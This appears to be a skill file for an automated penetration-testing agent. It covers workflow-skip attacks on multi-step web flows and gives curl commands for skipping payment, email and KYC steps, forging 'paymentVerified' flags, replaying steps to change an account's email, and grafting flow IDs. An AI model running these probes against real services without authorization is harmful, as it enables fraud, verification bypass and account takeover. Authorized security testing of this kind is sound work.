---
name: workflow_skip
agent: agent8_logic
description: Break multi-step flows by skipping steps — direct POSTs to later stages, missing step-order enforcement, and finalize-without-prerequisite bypasses.
---

# Workflow Skip

## Purpose
This skill breaks multi-step server workflows (signup, KYC verification, checkout, onboarding wizards, password reset, booking flows) by executing steps out of order or skipping them entirely. The vulnerability class is missing step-order enforcement: the server trusts the client to have completed prerequisites (payment verification, email verification, identity checks) instead of verifying state itself. Impact ranges from unpaid orders and unverified accounts to KYC bypass and privilege grants without approval.

## Division of labor
- **Consumes:** multi-step flow endpoint sequences from `recon/endpoints_live.txt` (ordered step URLs), JS state-machine code from `hidden_endpoint_discovery/wordlist_hits.txt` (step names, `currentStep`, `isVerified` flags)
- **Produces:** the finished artifact — `findings/workflow_skip_confirmed.md` with raw request/response pairs and verdicts

## When to use / when NOT to use
- **Use when:** you mapped a flow with 3+ ordered steps where a later step has security value (pay → confirm, verify email → activate, approve → grant, KYC → unlock limits); JS shows a step state machine; a "finalize"/"complete"/"confirm" endpoint exists.
- **Skip when (time-pass filter):** every step is independently authenticated and the final step re-validates prerequisites server-side (verify once with a direct POST — one probe decides); the flow is purely cosmetic (profile completion wizards with no gated capability). Ask: does skipping unlock something real (money, access, limits)? Is the skipped step the actual security control?

## Methodology
1. **Map the required step order.** Walk the flow legitimately once, recording every request in order: step 1 → step 2 → … → finalize. From JS, extract the state machine: step names, transition conditions, and any client-side flags like `paymentVerified: true`. This ordered list is your baseline.
2. **Identify the security-critical steps.** Mark which steps are actual controls vs convenience: payment capture, email/phone verification, KYC/identity check, admin approval, terms acceptance that gates liability. These are your skip targets — skipping a "choose your avatar" step is time-pass.
3. **Direct POST to later steps.** With a fresh session that completed only step 1, POST directly to the step-3 (or finalize) endpoint with step-3's expected body. If the server processes it without demanding step 2, step-order enforcement is missing.
4. **Skip to finalize.** The highest-value probe: fresh session, zero prior steps, direct call to `/complete`, `/finalize`, `/confirm`, `/activate`. A 200 that creates the order/account/grant = CONFIRMED workflow skip. Compare against the baseline legitimate completion — the skipped result must be functionally equivalent (order created, account active).
5. **Steps executed server-side vs gated client-side.** For each step, determine where its logic lives: if step 2's "verification" is a JS check that never calls the server, the server has no step 2 at all — everything after it is directly callable. Grep the JS for the step's API calls to prove this.
6. **Parameter-driven step jumping.** Try `{"step": 3}`, `?step=final`, `{"currentStep":"complete"}`, and `{"completedSteps":[1,2,3]}` on the flow's state endpoint. Some flows store progress in a client-supplied field and trust it.
7. **Replay an early step after completion.** Complete the flow legitimately, then replay the step-1 request (e.g. re-submit KYC with different data, re-run "apply discount" after payment). If the server re-processes it against a completed flow, you get state corruption: double discounts, overwritten verified identity, re-triggered welcome credits.
8. **Finalize-without-prerequisite variants.** Target each prerequisite individually: call the finalize endpoint (a) without payment verification, (b) without email verification (fresh unverified account), (c) without the approval step. Use a fresh session per variant so one variant's state doesn't pollute another.
9. **Out-of-order and repeated steps.** Submit step 3 before step 2, submit step 2 twice with different data (which wins?), submit steps in reverse. Record exactly which orders the server accepts — the accepted set defines the real (broken) state machine.
10. **ID-swapping across steps.** If steps reference a flow ID (`flow_id`, `session_id`, `order_id`), complete steps 1–2 on flow X, then call step 3 with flow Y's ID (another user's or a guessed one). Cross-flow step binding failures let you graft your completed prerequisites onto someone else's flow or vice versa.
11. **Stale-step resurrection.** Abandon a flow mid-way, start a new one, then submit the OLD flow's step-3 token/ID against the NEW flow. Servers that validate the token but not its flow binding accept it.
12. **Token/session fixation check.** Start two fresh flows in two clean sessions and compare the flow tokens/IDs. Sequential, timestamp-derived, or reusable tokens mean the flow identifier itself is attacker-predictable — combine with step 10's grafting for cross-account step injection.
13. **Verify the skipped outcome is real.** A 200 on finalize is not enough: re-read the resulting object (order status, account flags, limit fields) and confirm the gated capability is actually unlocked (account shows `verified: true`, order shows `paid`, limits raised). Cosmetic 200s without state change are INCONCLUSIVE.
13. **Negative control.** For each CONFIRMED skip, also show the legitimate path's prerequisite response (e.g. what the server returns when you do it properly) — this proves the skipped step was load-bearing, not decorative.
14. **Write every vector up.** Each skip variant gets a verdict: CONFIRMED (gated capability unlocked without the control step), INCONCLUSIVE (200 but no state change — needs human), NEGATIVE (server enforced order — document the enforcement response so nobody re-tests).

## Exact commands
Baseline — walk the flow legitimately once, saving each step's raw exchange in order:
```bash
mkdir -p /tmp/wf && cd /tmp/wf
curl -s -i -b cookies_A.txt -c cookies_A.txt -X POST "https://<HOST>/api/flow/start" \
  -H 'Content-Type: application/json' -d '{"plan":"pro"}' -o step1.txt
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/flow/verify-email" \
  -H 'Content-Type: application/json' -d '{"code":"<CODE>"}' -o step2.txt
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/flow/payment" \
  -H 'Content-Type: application/json' -d '{"token":"<PAYTOKEN>"}' -o step3.txt
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/flow/finalize" \
  -H 'Content-Type: application/json' -d '{}' -o step4_finalize.txt
grep -h "^HTTP" step*.txt   # the legitimate status sequence — your baseline
```
Skip probe — fresh session, straight to finalize with no prior steps:
```bash
rm -f /tmp/wf/cookies_skip.txt
curl -s -i -b /tmp/wf/cookies_skip.txt -c /tmp/wf/cookies_skip.txt \
  -X POST "https://<HOST>/api/flow/finalize" \
  -H 'Content-Type: application/json' -d '{}' -o /tmp/wf/skip_finalize.txt
head -c 600 /tmp/wf/skip_finalize.txt; echo
# Then verify the outcome is REAL — re-read the created object:
curl -s -b /tmp/wf/cookies_skip.txt "https://<HOST>/api/account" \
  | grep -Eo '"(verified|status|plan|limits)":("?[A-Za-z0-9_]+"?)'
```
Step-by-step skip ladder (fresh session per rung):
```bash
for SKIP_TO in 2 3 4; do
  rm -f /tmp/wf/c_$SKIP_TO.txt
  echo "=== fresh session, direct to step $SKIP_TO ==="
  case $SKIP_TO in
    2) EP="verify-email"; BODY='{"code":"000000"}';;
    3) EP="payment";      BODY='{"token":"skip"}';;
    4) EP="finalize";     BODY='{}';;
  esac
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    -b /tmp/wf/c_$SKIP_TO.txt -c /tmp/wf/c_$SKIP_TO.txt \
    -X POST "https://<HOST>/api/flow/$EP" \
    -H 'Content-Type: application/json' -d "$BODY"
done
# Any 200 where the baseline demanded prior steps = enforcement missing at that rung.
```
Parameter-driven step jumping:
```bash
for S in 3 final complete '{"completedSteps":[1,2,3]}'; do
  echo "=== step=$S ==="
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" -b cookies_A.txt \
    -X POST "https://<HOST>/api/flow/state" \
    -H 'Content-Type: application/json' -d "{\"step\":\"$S\"}"
done
curl -s -b cookies_A.txt -X POST "https://<HOST>/api/flow/state" \
  -H 'Content-Type: application/json' -d '{"currentStep":"complete","paymentVerified":true}' \
  | head -c 400; echo
```
Replay-early-step-after-completion (state corruption check):
```bash
# After legitimate completion with cookies_A.txt, replay step 1 with altered data:
curl -s -i -b cookies_A.txt -X POST "https://<HOST>/api/flow/verify-email" \
  -H 'Content-Type: application/json' -d '{"code":"999999","email":"attacker@evil.test"}' | head -c 400; echo
curl -s -b cookies_A.txt "https://<HOST>/api/account" | grep -Eo '"email":"[^"]*"'
# If the account email changed post-completion, the server re-processed a dead step.
```
Cross-flow ID grafting:
```bash
# Flow X (yours): complete steps 1-2 -> FLOW_X. Flow Y (fresh session): only start -> FLOW_Y.
curl -s -b cookies_A.txt -X POST "https://<HOST>/api/flow/payment" \
  -H 'Content-Type: application/json' -d "{\"flow_id\":\"$FLOW_Y\",\"token\":\"<PAYTOKEN>\"}" | head -c 400
# If Y advances on X's payment, step binding is broken.
```
Token/session fixation check — compare flow IDs across two clean sessions:
```bash
T1=$(curl -s -c /tmp/wf/fix1.txt -X POST "https://<HOST>/api/flow/start" \
  -H 'Content-Type: application/json' -d '{"plan":"pro"}' | grep -o '"flow_id":"[^"]*"' | head -1)
T2=$(curl -s -c /tmp/wf/fix2.txt -X POST "https://<HOST>/api/flow/start" \
  -H 'Content-Type: application/json' -d '{"plan":"pro"}' | grep -o '"flow_id":"[^"]*"' | head -1)
echo "flow1=$T1 flow2=$T2"
# Sequential / timestamp-derived / identical tokens = predictable flow IDs; combine with grafting above.
```
2x reproduction of the winning skip (fresh session each run, verify real outcome each run):
```bash
for RUN in 1 2; do
  rm -f /tmp/wf/repro_$RUN.txt
  curl -s -i -c /tmp/wf/rc_$RUN.txt -X POST "https://<HOST>/api/flow/finalize" \
    -H 'Content-Type: application/json' -d '{}' -o /tmp/wf/repro_$RUN.txt
  echo "run $RUN: $(head -1 /tmp/wf/repro_$RUN.txt)"
  curl -s -b /tmp/wf/rc_$RUN.txt "https://<HOST>/api/account" \
    | grep -Eo '"(verified|status)":("?[A-Za-z0-9_]+"?)' | tr '\n' ' '; echo
done
# CONFIRMED requires the gated capability unlocked in BOTH runs without the control step.
```

## Completion-bias defenses
- [ ] Full legitimate flow walked once; every step's raw request/response saved in order (baseline)
- [ ] Security-critical steps identified (payment, verification, KYC, approval) — skip targets named
- [ ] Direct POST to each later step from a fresh partial session tested
- [ ] Skip-to-finalize from a zero-step fresh session tested
- [ ] Client-side-only steps identified via JS (no server call = no server step)
- [ ] Parameter-driven jumping tested (`step`, `currentStep`, `completedSteps`, flag injection)
- [ ] Early-step replay after completion tested (state corruption check)
- [ ] Each prerequisite individually bypassed (no-payment, no-email-verify, no-approval variants)
- [ ] Out-of-order and repeated-step submissions tested; accepted orders recorded
- [ ] Cross-flow ID grafting tested (step from flow X applied to flow Y)
- [ ] Stale-step resurrection tested (old flow token against new flow)
- [ ] Token/session fixation check: flow tokens compared across two fresh sessions — predictable or reusable tokens recorded
- [ ] Skipped outcome verified REAL: gated capability confirmed unlocked via re-read, not just a 200
- [ ] Negative control captured: legitimate prerequisite response saved for comparison
- [ ] Every vector has a verdict with raw pairs in `findings/workflow_skip_confirmed.md`
- **Review step:** agent10_review must verify for each CONFIRMED verdict: (1) the fresh-session skip used no prior steps (cookie jar was empty — check the commands), (2) the unlocked capability is confirmed via an independent re-read of the resulting object, (3) the skipped step is shown to be load-bearing via the negative control, and (4) both reproduction runs independently reach the unlocked state.
- **Nudge prompts:** "Keep going until you have tested every parameter, not just the first one that responded." / "Do not report done before the finished artifact exists on disk." / "A 200 on finalize means nothing until you prove the account, order, or grant is actually live."
- **Finished artifact definition:** `findings/workflow_skip_confirmed.md` exists and contains, per tested vector: the ordered baseline flow, the skip variant (exact request), both reproduction outputs, the independent outcome verification (re-read showing the unlocked capability), the negative control, and verdict CONFIRMED / INCONCLUSIVE / NEGATIVE.

## Evidence standard
- Baseline: compare every hit against a known-dead path on the same host
- Reproduction: 2x independent reproduction required
- Raw evidence: full request/response pairs saved
- Verdicts: CONFIRMED (meets all three) / INCONCLUSIVE (needs a second model run or human) / NEGATIVE (dead end, documented so nobody re-tests it)

## Handoffs
- `idor_ladder` consumes CONFIRMED cross-flow grafting: a broken flow binding often means predictable flow IDs — it needs the flow-ID format and the graft request from the artifact.
- `mass_assignment` consumes CONFIRMED flag-injection (`paymentVerified: true` accepted): client-supplied state flags hint at broader auto-binding — it needs the accepted flag names.
- `agent9_chain` consumes CONFIRMED KYC/approval bypasses: an unverified-but-active account is the starting point for limit-abuse chains — it needs the exact unlocked flags and their values.
